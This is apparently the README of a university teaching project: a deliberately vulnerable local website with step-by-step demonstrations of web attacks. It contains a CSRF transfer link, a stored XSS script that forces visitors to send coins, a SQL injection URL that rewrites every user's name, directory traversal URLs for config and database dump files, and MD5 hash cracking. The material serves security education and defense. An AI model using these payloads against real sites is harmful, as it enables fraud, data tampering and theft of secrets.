# Base website security demo
- designed for students of [KIV/WEB](https://courseware.zcu.cz/portal/studium/courseware/kiv/web) of [University of West Bohemia](http://www.zcu.cz/en/)

## Presentation
[Slides from presentation](PRESENTATION.pdf)

## Development
### Installation
1. [Install Docker](https://docs.docker.com/install/)
1. [Install Docker Compose](https://docs.docker.com/compose/install/)
1. Clone this repository `git clone https://github.com/intraworlds/zcu-security-demo.git`
or download [ZIP file](https://github.com/intraworlds/zcu-security-demo/archive/master.zip)

### Run
1. run `docker-compose up` and you access the website
 - **app**: http://localhost:8088/
  - username: `willis.ritchie@example.com`
  - password: `richie`
 - **adminer**: http://localhost:8086/?server=mysql&username=admin&db=zcu_demo
  - password: `1234`

> Note: It'll take a minute to build docker container - be patient.

### Simulate attacks

#### CSRF
- goto http://localhost:8088/?path=create&receiver=1&amount=1&desc=❤️&submit=create
- observe that 1 IW coin was transfered to user #1 without your consent

#### XSS (with CSRF)
- goto http://localhost:8088/?path=create
- create new transaction with following description
```html
❤️
<script>
fetch("/?path=create&receiver=1&amount=1&desc=❤️&submit=create");
</script>
```
- observe that now everybody who visits list of transactions will send a coin
to user #1 without consent

#### SQL injection
- go to http://localhost:8088/?path=list&limit=50;update%20users%20set%20name=%27Anonymous%27;
- refresh page
- observe that all users are named `Anonymous`

#### Directory traversal
try following URLs
- http://localhost:8088/docker-compose.yml
- http://localhost:8088/config/app.env
- http://localhost:8088/dumps/zcu_demo.sql

##### Defense
Adjust apache configuration
```
# denied all files
<RequireAll>
    Require all denied
</RequireAll>

# whitelist only *.php and other files
<FilesMatch "((^$)|(^.+\.(php|css|map|js)$))">
    Require all granted
</FilesMatch>
```


#### Weak hash algorithm
try use `hashcat`
```
php scripts/crack_md5_hash.php 75b71aa6842e450f12aca00fdf54c51d
```

### Docker tips
Show all running containers
```
docker-compose ps
```
See logs
```
docker-compose logs -f
```
Connect container
```
docker-compose exec apache bash -l
```

## attacks

- [Full list of attacks](https://www.owasp.org/index.php/Category:Attack)

### XSS (Cross-site Scripting)
 - [OWASP XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
 - [OWASP testing for XSS](https://www.owasp.org/index.php/Testing_for_Cross_site_scripting)
 - [PHP triky: Cross Site Scripting](https://php.vrana.cz/cross-site-scripting.php) (czech only)

### HTTP Headers
 - [X-XSS-Protection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection)
 - [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

### SQL injection
 - [OWASP SQL injection](https://www.owasp.org/index.php/SQL_Injection)
 - [Soom: SQL Injection (Full Paper)](https://www.soom.cz/clanky/1180--SQL-Injection-Full-Paper#sekce5) (czech only)
 - [PHP triky: Obrana proti SQL Injection](https://php.vrana.cz/obrana-proti-sql-injection.php) (czech only)

### CSFR (Cross-Site Request Forgery)
 - [OWASP CSFR](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
 - [Soom](https://www.soom.cz/clanky/484--Cross-Site-Request-Forgery) (czech only)
 - [PHP triky: Cross-Site Request Forgery](https://php.vrana.cz/cross-site-request-forgery.php) (czech only)
 - [Co je Cross-Site Request Forgery a jak se mu bránit](https://www.zdrojak.cz/clanky/co-je-cross-site-request-forgery-a-jak-se-branit/) (czech only)

### Path (Directory) Traversal
 - [OWASP Path Traversal](https://www.owasp.org/index.php/Path_Traversal)

### Others
 - [Self tweeting tweet](https://twitter.com/derGeruhn/status/476764918763749376)
